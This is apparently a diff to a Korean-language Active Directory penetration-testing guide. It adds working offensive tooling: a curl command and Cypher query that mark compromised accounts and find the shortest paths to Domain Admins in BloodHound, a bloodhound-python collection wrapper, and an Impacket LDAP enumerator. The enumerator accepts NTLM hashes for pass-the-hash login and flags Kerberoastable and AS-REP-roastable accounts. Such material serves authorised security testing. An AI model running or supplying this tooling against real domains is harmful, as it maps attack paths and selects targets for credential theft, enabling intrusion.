@@ -395,8 +395,8 @@ python3 ntlmrelayx.py \
 
 ## 8. BloodHound 공격 경로 활용
 
-```python
-# 공통 공격 체인 예시
+```
+공통 공격 체인 예시:
 
 경로 1: 일반 사용자 → 도메인 관리자
   일반 사용자
@@ -419,11 +419,170 @@ python3 ntlmrelayx.py \
 ```
 
 ```bash
-# BloodHound 자동 마킹
-# 침해된 계정/컴퓨터 마킹
-curl -X POST http://localhost:7474/db/data/cypher \
+# BloodHound 자동 마킹 — 침해된 계정/컴퓨터 표시
+curl -s -X POST http://localhost:7474/db/data/cypher \
     -H "Content-Type: application/json" \
-    -d '{"query": "MATCH (u:User {name:\"COMPROMISED@DOMAIN\"}) SET u.owned=true"}'
+    -u neo4j:bloodhound \
+    -d '{"query": "MATCH (u:User {name:\"COMPROMISED@DOMAIN\"}) SET u.owned=true RETURN u.name"}'
+
+# 가장 위험한 경로 Top 5 (Cypher)
+# DA까지 최단 경로 노드 수
+MATCH p=shortestPath((u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@COMPANY.LOCAL"}))
+RETURN u.name, length(p) ORDER BY length(p) LIMIT 5
+```
+
+### BloodHound 데이터 수집 자동화 (Python)
+
+```python
+#!/usr/bin/env python3
+"""
+BloodHound 수집 자동화 — bloodhound-python 래퍼
+여러 수집 방법을 순차 시도하고 결과를 통합
+사용법: python3 bh_collect.py -d company.local -u user -p Password123 --dc 10.0.0.1
+"""
+import argparse
+import json
+import shutil
+import subprocess
+import sys
+import tempfile
+import zipfile
+from datetime import datetime
+from pathlib import Path
+
+
+COLLECTION_METHODS = ["Default", "DCOnly", "LocalAdmin", "Session", "Trusts", "ACL"]
+
+
+def check_prerequisites() -> bool:
+    """bloodhound-python 설치 확인."""
+    if shutil.which("bloodhound-python"):
+        return True
+    print("[!] bloodhound-python이 필요합니다: pip3 install bloodhound")
+    return False
+
+
+def run_collection(
+    domain: str, dc_ip: str, username: str,
+    password: str = "", ntlm_hash: str = "",
+    method: str = "All", output_dir: Path = Path("."),
+    dns_tcp: bool = False,
+) -> bool:
+    """bloodhound-python 실행."""
+    cmd = [
+        "bloodhound-python",
+        "-d", domain,
+        "-u", username,
+        "--dc", dc_ip,
+        "-c", method,
+        "--zip",
+        "-o", str(output_dir),
+        "--dns-timeout", "5",
+        "--dns-tcp" if dns_tcp else "",
+    ]
+
+    if password:
+        cmd += ["-p", password]
+    elif ntlm_hash:
+        cmd += ["-hashes", ntlm_hash]
+
+    cmd = [c for c in cmd if c]  # 빈 문자열 제거
+
+    print(f"[*] 수집 방법: {method}")
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True, text=True, timeout=300,
+        )
+        if result.returncode == 0:
+            print(f"[+] 수집 완료: {method}")
+            return True
+        else:
+            print(f"[!] 수집 실패: {result.stderr[:200]}")
+            return False
+    except subprocess.TimeoutExpired:
+        print("[!] 수집 시간 초과 (300초)")
+        return False
+    except FileNotFoundError:
+        print("[!] bloodhound-python 실행 파일을 찾을 수 없습니다")
+        return False
+
+
+def merge_zip_files(output_dir: Path, final_name: str) -> Path:
+    """수집된 JSON 파일들을 단일 ZIP으로 통합."""
+    json_files = list(output_dir.glob("*.json"))
+    final_zip = output_dir / final_name
+
+    with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+        for jf in json_files:
+            zf.write(jf, jf.name)
+
+    print(f"[+] 통합 ZIP: {final_zip}  ({len(json_files)}개 파일)")
+    return final_zip
+
+
+def print_summary(output_dir: Path) -> None:
+    """수집된 JSON에서 개수 요약 출력."""
+    summary: dict[str, int] = {}
+    for jf in output_dir.glob("*.json"):
+        try:
+            data = json.loads(jf.read_text())
+            key = jf.stem.split("_")[0].capitalize()
+            count = data.get("meta", {}).get("count", len(data.get("data", [])))
+            summary[key] = summary.get(key, 0) + count
+        except Exception:
+            continue
+
+    print("\n[*] 수집 요약:")
+    for obj_type, count in sorted(summary.items()):
+        print(f"    {obj_type:<15}  {count:>6}개")
+
+
+def main() -> None:
+    if not check_prerequisites():
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(description="BloodHound 데이터 수집 자동화")
+    parser.add_argument("-d", "--domain", required=True, help="대상 도메인")
+    parser.add_argument("-u", "--username", required=True, help="사용자명")
+    parser.add_argument("-p", "--password", default="", help="비밀번호")
+    parser.add_argument("-H", "--hash", default="", dest="ntlm_hash", help="NTLM 해시")
+    parser.add_argument("--dc", required=True, dest="dc_ip", help="DC IP")
+    parser.add_argument("-o", "--output", default="bloodhound_data", help="출력 디렉토리")
+    parser.add_argument("-c", "--collection", default="All",
+                        choices=COLLECTION_METHODS + ["All"], help="수집 방법")
+    parser.add_argument("--dns-tcp", action="store_true", help="DNS TCP 사용")
+    args = parser.parse_args()
+
+    output_dir = Path(args.output)
+    output_dir.mkdir(parents=True, exist_ok=True)
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    success = run_collection(
+        domain=args.domain,
+        dc_ip=args.dc_ip,
+        username=args.username,
+        password=args.password,
+        ntlm_hash=args.ntlm_hash,
+        method=args.collection,
+        output_dir=output_dir,
+        dns_tcp=args.dns_tcp,
+    )
+
+    if success:
+        print_summary(output_dir)
+        zip_file = merge_zip_files(output_dir, f"bloodhound_{ts}.zip")
+        print(f"\n[+] BloodHound에 '{zip_file}' 를 임포트하세요")
+        print("    neo4j 시작: sudo neo4j start")
+        print("    BloodHound 실행 후 Upload Data → zip 파일 선택")
+    else:
+        print("[!] 수집 실패")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
@@ -454,6 +613,264 @@ apt-get install python3-impacket impacket-scripts
 [domain_realm]
     .company.local = COMPANY.LOCAL
     company.local = COMPANY.LOCAL
+```
+
+### AD 열거 자동화 도구 (Python — Impacket 기반)
+
+```python
+#!/usr/bin/env python3
+"""
+Active Directory 자동 열거 도구 — Impacket 기반
+- 사용자/그룹/컴퓨터/SPN/AS-REP 대상 일괄 수집
+- 결과를 JSON과 텍스트 보고서로 저장
+사용법:
+  python3 ad_enum.py -d company.local -u user -p Password123 --dc 192.168.1.10
+  python3 ad_enum.py -d company.local -u user -H <NTLM_HASH> --dc 192.168.1.10
+"""
+import argparse
+import json
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from pathlib import Path
+
+try:
+    from impacket.dcerpc.v5 import transport, samr
+    from impacket.ldap import ldap, ldaptypes
+    from impacket.ldap.ldapasn1 import SearchResultEntry
+    from impacket.smbconnection import SMBConnection
+except ImportError:
+    sys.exit("[!] impacket가 필요합니다: pip3 install impacket")
+
+
+class ADEnumerator:
+    """Impacket LDAP을 통한 AD 개체 열거."""
+
+    BASE_ATTRS_USER = [
+        "sAMAccountName", "userPrincipalName", "displayName",
+        "memberOf", "userAccountControl", "pwdLastSet",
+        "lastLogon", "servicePrincipalName", "description",
+    ]
+    BASE_ATTRS_COMP = [
+        "sAMAccountName", "dNSHostName", "operatingSystem",
+        "operatingSystemVersion", "lastLogon",
+    ]
+    BASE_ATTRS_GROUP = [
+        "sAMAccountName", "description", "member", "memberOf",
+    ]
+
+    UAC_FLAGS = {
+        0x0002: "DISABLED",
+        0x0010: "LOCKOUT",
+        0x0020: "PASSWD_NOTREQD",
+        0x0040: "PASSWD_CANT_CHANGE",
+        0x0200: "NORMAL_ACCOUNT",
+        0x10000: "DONT_EXPIRE_PASSWORD",
+        0x400000: "NOT_DELEGATED",
+        0x1000000: "PREAUTH_NOT_REQUIRED",  # AS-REP Roasting 대상
+    }
+
+    def __init__(self, domain: str, dc_ip: str, username: str,
+                 password: str = "", ntlm_hash: str = "") -> None:
+        self.domain = domain
+        self.dc_ip = dc_ip
+        self.username = username
+        self.password = password
+        self.ntlm_hash = ntlm_hash
+        self.base_dn = "dc=" + ",dc=".join(domain.split("."))
+        self._conn: ldap.LDAPConnection | None = None
+        self.results: dict = {
+            "domain": domain, "dc_ip": dc_ip,
+            "users": [], "groups": [], "computers": [],
+            "kerberoastable": [], "asrep_roastable": [],
+            "enumerated_at": datetime.now().isoformat(),
+        }
+
+    def connect(self) -> None:
+        """LDAP 연결 수립."""
+        ldap_url = f"ldap://{self.dc_ip}"
+        try:
+            self._conn = ldap.LDAPConnection(ldap_url, self.base_dn)
+            lm_hash, nt_hash = ("", "")
+            if self.ntlm_hash:
+                if ":" in self.ntlm_hash:
+                    lm_hash, nt_hash = self.ntlm_hash.split(":", 1)
+                else:
+                    lm_hash, nt_hash = ("aad3b435b51404eeaad3b435b51404ee", self.ntlm_hash)
+            self._conn.login(
+                self.username, self.password,
+                self.domain, lm_hash, nt_hash
+            )
+            print(f"[+] LDAP 연결 성공: {self.dc_ip}")
+        except Exception as e:
+            sys.exit(f"[!] LDAP 연결 실패: {e}")
+
+    def _search(self, ldap_filter: str, attributes: list[str]) -> list[dict]:
+        """LDAP 검색 실행 및 결과 딕셔너리 목록 반환."""
+        results: list[dict] = []
+        try:
+            sc = ldap.SimplePagedResultsControl(size=1000)
+            resp = self._conn.search(
+                searchFilter=ldap_filter,
+                attributes=attributes,
+                sizeLimit=0,
+                searchControls=[sc],
+            )
+            for item in resp:
+                if not isinstance(item, SearchResultEntry):
+                    continue
+                entry: dict = {}
+                for attr in item["attributes"]:
+                    name = str(attr["type"])
+                    vals = [str(v) for v in attr["vals"]]
+                    entry[name] = vals[0] if len(vals) == 1 else vals
+                results.append(entry)
+        except Exception as e:
+            print(f"[!] 검색 오류 ({ldap_filter[:40]}): {e}")
+        return results
+
+    def _decode_uac(self, uac_val: str) -> list[str]:
+        try:
+            uac = int(uac_val)
+        except (ValueError, TypeError):
+            return []
+        return [name for flag, name in self.UAC_FLAGS.items() if uac & flag]
+
+    def enum_users(self) -> None:
+        """사용자 계정 열거 — Kerberoastable / AS-REP 대상 식별."""
+        print("[*] 사용자 열거 중...")
+        users = self._search(
+            "(objectClass=user)", self.BASE_ATTRS_USER
+        )
+        for user in users:
+            uac_flags = self._decode_uac(user.get("userAccountControl", "0"))
+            user["uac_flags"] = uac_flags
+            self.results["users"].append(user)
+
+            sam = user.get("sAMAccountName", "")
+            # Kerberoastable: SPN 있는 계정
+            spn = user.get("servicePrincipalName")
+            if spn:
+                self.results["kerberoastable"].append({
+                    "account": sam, "spn": spn,
+                })
+                print(f"  [Kerberoast] {sam}  SPN: {spn}")
+
+            # AS-REP Roastable: 사전 인증 불필요
+            if "PREAUTH_NOT_REQUIRED" in uac_flags:
+                self.results["asrep_roastable"].append({"account": sam})
+                print(f"  [AS-REP]     {sam}  (사전 인증 불필요)")
+
+        print(f"[+] 사용자: {len(users)}명  "
+              f"Kerberoastable: {len(self.results['kerberoastable'])}  "
+              f"AS-REP: {len(self.results['asrep_roastable'])}")
+
+    def enum_groups(self) -> None:
+        """그룹 열거 — Domain Admins, Enterprise Admins 멤버 강조."""
+        print("[*] 그룹 열거 중...")
+        groups = self._search("(objectClass=group)", self.BASE_ATTRS_GROUP)
+        self.results["groups"] = groups
+
+        high_value = ["Domain Admins", "Enterprise Admins", "Schema Admins",
+                      "Administrators", "Account Operators"]
+        for grp in groups:
+            if grp.get("sAMAccountName") in high_value:
+                members = grp.get("member", [])
+                if isinstance(members, str):
+                    members = [members]
+                if members:
+                    print(f"  [!] {grp['sAMAccountName']}: {len(members)}명")
+                    for m in members[:5]:
+                        print(f"      {m.split(',')[0].replace('CN=', '')}")
+        print(f"[+] 그룹: {len(groups)}개")
+
+    def enum_computers(self) -> None:
+        """컴퓨터 계정 열거."""
+        print("[*] 컴퓨터 열거 중...")
+        computers = self._search("(objectClass=computer)", self.BASE_ATTRS_COMP)
+        self.results["computers"] = computers
+        print(f"[+] 컴퓨터: {len(computers)}대")
+
+        # 구버전 OS 탐지
+        legacy = [c for c in computers
+                  if any(k in c.get("operatingSystem", "") for k in ["2003", "XP", "Vista", "2008"])]
+        if legacy:
+            print(f"  [!] 구버전 OS {len(legacy)}대 발견:")
+            for c in legacy[:5]:
+                print(f"      {c.get('dNSHostName', c.get('sAMAccountName'))}  "
+                      f"→  {c.get('operatingSystem', '?')}")
+
+    def save_report(self, output_dir: Path) -> None:
+        """JSON 및 텍스트 보고서 저장."""
+        output_dir.mkdir(parents=True, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        json_path = output_dir / f"ad_enum_{ts}.json"
+        json_path.write_text(json.dumps(self.results, indent=2, ensure_ascii=False))
+        print(f"\n[+] JSON 저장: {json_path}")
+
+        txt_path = output_dir / f"ad_enum_{ts}.txt"
+        lines = [
+            f"AD 열거 보고서  {self.results['enumerated_at']}",
+            f"도메인: {self.domain}  DC: {self.dc_ip}",
+            "=" * 55,
+            f"사용자: {len(self.results['users'])}명",
+            f"그룹:   {len(self.results['groups'])}개",
+            f"컴퓨터: {len(self.results['computers'])}대",
+            f"Kerberoastable: {len(self.results['kerberoastable'])}계정",
+            f"AS-REP Roastable: {len(self.results['asrep_roastable'])}계정",
+            "",
+            "[ Kerberoastable 계정 ]",
+        ] + [f"  {k['account']}  {k['spn']}" for k in self.results["kerberoastable"]] + [
+            "",
+            "[ AS-REP Roastable 계정 ]",
+        ] + [f"  {k['account']}" for k in self.results["asrep_roastable"]]
+
+        txt_path.write_text("\n".join(lines))
+        print(f"[+] 텍스트 저장: {txt_path}")
+
+    def run_all(self) -> None:
+        """전체 열거 실행."""
+        self.connect()
+        self.enum_users()
+        self.enum_groups()
+        self.enum_computers()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="AD 자동 열거 도구 (Impacket LDAP)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""예시:
+  python3 ad_enum.py -d company.local -u alice -p Password123 --dc 192.168.1.10
+  python3 ad_enum.py -d company.local -u alice -H aad3b435...:31d6cfe... --dc 10.0.0.1
+        """,
+    )
+    parser.add_argument("-d", "--domain", required=True, help="대상 도메인 (예: company.local)")
+    parser.add_argument("-u", "--username", required=True, help="인증 사용자명")
+    parser.add_argument("-p", "--password", default="", help="비밀번호")
+    parser.add_argument("-H", "--hash", default="", dest="ntlm_hash",
+                        help="NTLM 해시 (LM:NT 또는 NT만)")
+    parser.add_argument("--dc", required=True, dest="dc_ip", help="DC IP 주소")
+    parser.add_argument("-o", "--output", default="ad_results", help="결과 저장 디렉토리")
+    args = parser.parse_args()
+
+    if not args.password and not args.ntlm_hash:
+        sys.exit("[!] -p <password> 또는 -H <hash> 중 하나가 필요합니다")
+
+    enumerator = ADEnumerator(
+        domain=args.domain,
+        dc_ip=args.dc_ip,
+        username=args.username,
+        password=args.password,
+        ntlm_hash=args.ntlm_hash,
+    )
+    enumerator.run_all()
+    enumerator.save_report(Path(args.output))
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### 원격 실행 도구 (Impacket)
